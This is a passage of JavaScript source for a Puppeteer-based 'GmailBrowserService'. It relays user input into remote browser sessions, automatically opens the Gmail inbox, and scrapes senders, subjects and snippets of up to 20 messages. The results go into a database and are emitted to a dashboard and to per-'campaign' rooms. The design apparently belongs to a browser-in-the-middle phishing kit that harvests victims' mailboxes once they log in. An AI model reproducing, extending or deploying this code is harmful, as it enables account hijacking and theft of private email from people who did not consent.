    for (const [sessionToken, sessionData] of this.activeSessions.entries()) {
      if (now - sessionData.createdAt > maxAge) {
        console.log(`🧹 Cleaning up inactive session: ${sessionToken}`);
        await this.closeSession(sessionToken);
      }
    }
  }

  /**
   * Start cleanup interval
   */
  startCleanupInterval() {
    setInterval(() => {
      this.cleanupInactiveSessions();
    }, 30 * 60 * 1000); // Every 30 minutes
  }

  /**
   * Check if a session exists and is active
   */
  async checkSessionExists(sessionToken) {
    try {
      if (!this.activeSessions.has(sessionToken)) {
        return false;
      }

      const browser = this.browsers.get(sessionToken);
      const page = this.pages.get(sessionToken);
      
      // Check if browser is still connected
      if (!browser || !browser.isConnected()) {
        console.log(`⚠️  Browser for session ${sessionToken} is disconnected`);
        this.cleanupSession(sessionToken);
        return false;
      }

      // Check if page is still valid
      if (!page || page.isClosed()) {
        console.log(`⚠️  Page for session ${sessionToken} is closed`);
        this.cleanupSession(sessionToken);
        return false;
      }

      return true;
    } catch (error) {
      console.error(`❌ Error checking session ${sessionToken}:`, error);
      return false;
    }
  }

  /**
   * Perform action on browser session
   */
  async performAction(sessionToken, action, params) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (!sessionData) {
        throw new Error('Session not found');
      }

      const page = this.pages.get(sessionToken);
      if (!page || page.isClosed()) {
        throw new Error('Browser page is not available');
      }

      switch (action) {
        case 'click':
          await page.mouse.click(params.x, params.y);
          break;
        
        case 'type':
          await page.keyboard.type(params.text);
          break;
        
        case 'key':
          await page.keyboard.press(params.key);
          break;
        
        case 'scroll':
          await page.evaluate((x, y) => {
            window.scrollBy(x, y);
          }, params.x || 0, params.y || 0);
          break;
        
        case 'navigate':
          await page.goto(params.url);
          break;
        
        default:
          throw new Error(`Unknown action: ${action}`);
      }

      // Update last activity
      sessionData.lastActivity = new Date();

      return { success: true, action, params };
    } catch (error) {
      console.error(`❌ Error performing action ${action}:`, error);
      throw error;
    }
  }

  /**
   * Health check for the service
   */
  async healthCheck() {
    try {
      const activeSessions = this.activeSessions.size;
      const uptime = Date.now() - (this.serviceStartTime || Date.now());
      
      // Check if we can launch a browser
      let browserHealthy = false;
      try {
        const testBrowser = await puppeteer.launch({
          headless: true,
          args: [
            '--no-sandbox',
            '--disable-setuid-sandbox',
            '--disable-dev-shm-usage',
            '--disable-accelerated-2d-canvas',
            '--no-first-run',
            '--no-zygote',
            '--single-process',
            '--disable-gpu'
          ]
        });
        await testBrowser.close();
        browserHealthy = true;
      } catch (error) {
        console.error('❌ Browser health check failed:', error);
      }

      return {
        status: browserHealthy ? 'healthy' : 'unhealthy',
        activeSessions,
        uptime,
        browserHealthy,
        timestamp: new Date().toISOString()
      };
    } catch (error) {
      console.error('❌ Health check error:', error);
      return {
        status: 'error',
        error: error.message,
        timestamp: new Date().toISOString()
      };
    }
  }

  /**
   * Automatically navigate to Gmail inbox and scrape emails
   */
  async autoNavigateToInboxAndScrape(sessionToken, page) {
    try {
      console.log(`📧 Auto-navigating to Gmail inbox for session: ${sessionToken}`);
      
      // Check if we're already in Gmail
      const currentUrl = page.url();
      if (!currentUrl.includes('mail.google.com')) {
        // Navigate to Gmail if not already there
        await page.goto('https://mail.google.com/mail/u/0/#inbox', { 
          waitUntil: 'networkidle0',
          timeout: 15000 
        });
      }

      // Wait for Gmail to load
      await page.waitForTimeout(3000);

      // Scrape emails
      await this.autoScrapeGmailEmails(sessionToken, page);

    } catch (error) {
      console.error('Error in auto-navigate to inbox:', error);
    }
  }

  /**
   * Automatically scrape Gmail emails and send to dashboard
   */
  async autoScrapeGmailEmails(sessionToken, page) {
    try {
      console.log(`🔍 Auto-scraping Gmail emails for session: ${sessionToken}`);
      
      // Wait for Gmail interface to load
      await page.waitForTimeout(2000);

      // Try multiple selectors for Gmail email list items
      const emailSelectors = [
        'tr.zA', // Gmail inbox row
        '[role="main"] [role="listitem"]', // Alternative Gmail selector
        '.ae4.ams', // Another Gmail selector
        '.aDP', // Gmail conversation selector
        '.Cp .aDP', // Gmail conversation in inbox
      ];

      let emails = [];
      
      for (const selector of emailSelectors) {
        try {
          await page.waitForSelector(selector, { timeout: 5000 });
          
          // Extract email data
          emails = await page.evaluate((emailSelector) => {
            const emailElements = document.querySelectorAll(emailSelector);
            const emailData = [];

            emailElements.forEach((element, index) => {
              if (index >= 20) return; // Limit to first 20 emails

              try {
                // Extract sender name
                const senderElement = element.querySelector('.yW span[email], .yW span[name], .go span, .bA4 span, .yW');
                const sender = senderElement ? senderElement.textContent.trim() : 'Unknown Sender';

                // Extract subject
                const subjectElement = element.querySelector('.bog, .y6 span, .a4W span, [role="link"] span span');
                const subject = subjectElement ? subjectElement.textContent.trim() : 'No Subject';

                // Extract date
                const dateElement = element.querySelector('.xY span, .xW span, .a4W .xY span');
                const date = dateElement ? dateElement.textContent.trim() : 'Unknown Date';

                // Extract snippet
                const snippetElement = element.querySelector('.y2, .y6, .a4W .y2');
                const snippet = snippetElement ? snippetElement.textContent.trim() : '';

                // Check if email is unread
                const isUnread = element.classList.contains('zE') || 
                                element.querySelector('.yW[style*="font-weight: bold"]') ||
                                element.classList.contains('zA.yO');

                if (sender && subject) {
                  emailData.push({
                    id: `email_${index}_${Date.now()}`,
                    sender,
                    subject,
                    date,
                    snippet: snippet.substring(0, 100),
                    isUnread,
                    scrapedAt: new Date().toISOString()
                  });
                }
              } catch (err) {
                console.warn('Error extracting email data:', err);
              }
            });

            return emailData;
          }, selector);

          if (emails.length > 0) {
            console.log(`✅ Successfully scraped ${emails.length} emails using selector: ${selector}`);
            break;
          }
        } catch (err) {
          console.log(`Selector ${selector} failed, trying next...`);
          continue;
        }
      }

      // If no emails found with standard selectors, try alternative approach
      if (emails.length === 0) {
        console.log('🔄 Trying alternative email scraping method...');
        emails = await this.scrapeEmailsAlternativeMethod(page);
      }

      if (emails.length > 0) {
        console.log(`📧 Successfully scraped ${emails.length} emails!`);
        
        // Store scraped emails in session data
        const sessionData = this.activeSessions.get(sessionToken);
        if (sessionData) {
          sessionData.scrapedEmails = emails;
          sessionData.lastEmailScrape = new Date();
        }

        // Send scraped emails to dashboard via Socket.IO
        if (this.io) {
          this.io.to(`gmail-session-${sessionToken}`).emit('emailsScraped', {
            emails,
            count: emails.length,
            scrapedAt: new Date(),
            sessionToken
          });

          // Also emit to campaign room
          if (sessionData && sessionData.campaignId) {
            this.io.to(`campaign-${sessionData.campaignId}`).emit('gmailEmailsScraped', {
              sessionToken,
              emails,
              count: emails.length,
              scrapedAt: new Date()
            });
          }
        }

        // Save to database
        await this.saveScrapedEmails(sessionToken, emails);

        return emails;
      } else {
        console.log('⚠️ No emails found to scrape');
        return [];
      }

    } catch (error) {
      console.error('Error auto-scraping Gmail emails:', error);
      return [];
    }
  }

  /**
   * Alternative method to scrape emails when standard selectors fail
   */
  async scrapeEmailsAlternativeMethod(page) {
    try {
      return await page.evaluate(() => {
        const emails = [];
        
        // Look for any elements that might contain email data
        const possibleEmailElements = [
          ...document.querySelectorAll('[role="main"] div'),
          ...document.querySelectorAll('.aDP'),
          ...document.querySelectorAll('tr[id]'),
          ...document.querySelectorAll('[data-thread-id]')
        ];

        possibleEmailElements.forEach((element, index) => {
          if (index >= 30) return; // Limit search

          const text = element.textContent;
          if (text && text.length > 10 && text.length < 500) {
            // Look for email-like patterns
            const emailPattern = /\b[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Z|a-z]{2,}\b/;
            const hasEmailPattern = emailPattern.test(text);
            
            // Look for common email subject patterns
            const hasSubjectPattern = /^(Re:|Fwd:|Subject:|From:)/i.test(text.trim());
            
            if (hasEmailPattern || hasSubjectPattern || 
                (text.includes('@') && (text.includes('gmail') || text.includes('yahoo') || text.includes('hotmail')))) {
              
              emails.push({
                id: `alt_email_${index}_${Date.now()}`,
                sender: 'Unknown Sender (Alt Method)',
                subject: text.substring(0, 50) + '...',
                date: 'Recently',
                snippet: text.substring(0, 100),
                isUnread: false,
                scrapedAt: new Date().toISOString(),
                method: 'alternative'
              });
            }
          }
        });

        return emails.slice(0, 10); // Return max 10 emails from alternative method
      });
    } catch (error) {
      console.error('Alternative scraping method failed:', error);
      return [];
    }
  }

  /**
   * Save scraped emails to database
   */
  async saveScrapedEmails(sessionToken, emails) {
    try {
      const Database = require('../database');
      const db = new Database();

      for (const email of emails) {
        await db.query(`
          INSERT OR REPLACE INTO scraped_emails (
            session_token, email_id, sender, subject, date, snippet, 
            is_unread, scraped_at, created_at
          ) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?)
        `, [
          sessionToken,
          email.id,
          email.sender,
          email.subject,
          email.date,
          email.snippet,
          email.isUnread ? 1 : 0,
          email.scrapedAt,
          new Date().toISOString()
        ]);
      }

      console.log(`💾 Saved ${emails.length} scraped emails to database`);
    } catch (error) {
      console.error('Error saving scraped emails to database:', error);
    }
  }

  /**
   * Get scraped emails for a session
   */
  async getScrapedEmails(sessionToken) {
    try {
      const sessionData = this.activeSessions.get(sessionToken);
      if (sessionData && sessionData.scrapedEmails) {
        return sessionData.scrapedEmails;
      }

      // Fall back to database
      const Database = require('../database');
      const db = new Database();
      
      const emails = await db.query(`
        SELECT * FROM scraped_emails 
        WHERE session_token = ? 
        ORDER BY created_at DESC 
        LIMIT 50
      `, [sessionToken]);

      return emails;
    } catch (error) {
      console.error('Error getting scraped emails:', error);
      return [];
    }
  }
}

module.exports = GmailBrowserService;
